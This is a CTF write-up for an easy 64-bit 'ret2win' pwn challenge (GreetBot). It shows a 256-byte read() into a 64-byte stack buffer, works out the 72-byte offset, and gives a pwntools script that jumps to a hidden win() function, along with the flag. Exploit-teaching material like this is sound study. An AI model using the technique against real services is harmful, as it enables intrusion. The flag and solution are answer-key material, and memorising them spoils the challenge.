# GreetBot

| Field | Value |
|-------|-------|
| Category | Pwn |
| Points | 100 |

## Description

> We found a legacy greeting service still running on a production server.
> The developers swear it's "just a simple greeter" — no harm possible.
>
> `nc <host> 4444`
>
> Attachments: `ret2win` (binary), `ret2win.c` (source)

## Solution

# GreetBot — Writeup (Easy PWN / ret2win)

## Challenge Overview

A 64-bit ELF binary runs as a network service. It greets you and exits.
There is a hidden `win()` function that reads and prints `flag.txt`.
The goal is to redirect execution to `win()` by exploiting a stack buffer overflow.

**Protections:**
| Protection | Status  |
|------------|---------|
| Canary     | ❌ OFF  |
| PIE        | ❌ OFF  |
| NX         | ✅ ON   |
| RELRO      | Partial |

---

## Step 1 — Static Analysis

### Checksec / file

```
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64 ... not stripped

$ checksec --file=ret2win
Canary: No   PIE: No   NX: Yes   RELRO: Partial
```

No canary → we can overflow freely.
No PIE → all addresses are fixed — no leak needed.

### Read the source (provided)

```c
void win() {
    int fd = open("flag.txt", O_RDONLY);
    // ... reads and prints flag, then exit(0)
}

void vuln() {
    char buf[64];
    write(1, "Enter your name: ", 17);
    read(0, buf, 256);        // ← reads 256 bytes into 64-byte buffer!
    write(1, "Hello, ", 7);
    write(1, buf, strlen(buf));
}
```

`read(0, buf, 256)` writes up to 256 bytes into a 64-byte stack buffer.
This is a classic stack buffer overflow.

### Find win() address

```
$ nm ret2win | grep win
0000000000401186 T win
```

`win()` is at **0x401186** — fixed because there's no PIE.

---

## Step 2 — Find the Offset

### Disassemble vuln()

```
$ objdump -d ret2win | grep -A 10 '<vuln>'
0000000000401263 <vuln>:
  401263:  push   %rbp
  401264:  mov    %rsp,%rbp
  401267:  sub    $0x40,%rsp     ← allocates 64 bytes (0x40) for buf
  ...
  40126b:  lea    -0x40(%rbp),%rax  ← buf at RBP - 0x40
  ...
  read(0, buf, 256)
```

Stack layout in `vuln()`:
```
┌─────────────────────┐  ← RBP - 0x40  (low address)
│  buf[64]            │
├─────────────────────┤  ← RBP
│  saved RBP          │  (8 bytes)
├─────────────────────┤  ← RBP + 0x08  ← we overwrite this
│  saved RIP          │
└─────────────────────┘
```

**Offset = 64 (buf) + 8 (saved RBP) = 72 bytes**

### Verify with GDB

```
$ gdb ./ret2win
(gdb) run
Enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
(gdb) info frame
  Saved RIP = 0x4242424242424242   ← "BBBBBBBB" appears at offset 72 ✓
```

---

## Step 3 — Build the Exploit

```python
from pwn import *

context.binary = elf = ELF('./ret2win', checksec=False)

WIN    = elf.symbols['win']   # 0x401186
OFFSET = 72                   # 64 buf + 8 saved RBP

p = remote('HOST', 4444)
# p = process('./ret2win')

payload  = b'A' * OFFSET
payload += p64(WIN)

p.recvuntil(b'Enter your name: ')
p.send(payload)
print(p.recvall(timeout=3).decode())
```

**Payload diagram:**
```
[ AAAA...AAAA ][ p64(0x401186) ]
  ← 72 bytes →    win() addr
```

---

## Step 4 — Run

```
$ python3 solve.py REMOTE <host> 4444
You got it! Flag: CHC{r3t2w1n_cl4ss1c_pwn_st4rt3r}
```

---

## Stack Alignment Note (Educational)

On x86-64, the ABI requires RSP to be 16-byte aligned before `call` instructions.
When overflowing the return address, RSP at `win()` entry is 16-byte aligned,
so calls inside `win()` work correctly.

If you encounter a `SIGSEGV` inside a libc function (`movaps` crash in malloc/fopen etc.),
prepend a bare `ret` gadget to realign the stack:

```python
RET    = 0x401016              # `ret` gadget
payload = b'A' * OFFSET + p64(RET) + p64(WIN)
```

This `win()` uses `open()/read()` syscall wrappers instead of `fopen()/fgets()`
to avoid glibc malloc alignment requirements entirely.

---

## Key Concepts Covered

- Reading disassembly to find buffer size (`sub $0x40, %rsp`)
- Calculating overflow offset: buf size + saved RBP = 72
- Overwriting saved RIP with a fixed function address
- No PIE → no leak needed; no Canary → no brute force needed

**Flag:** `CHC{r3t2w1n_cl4ss1c_pwn_st4rt3r}`

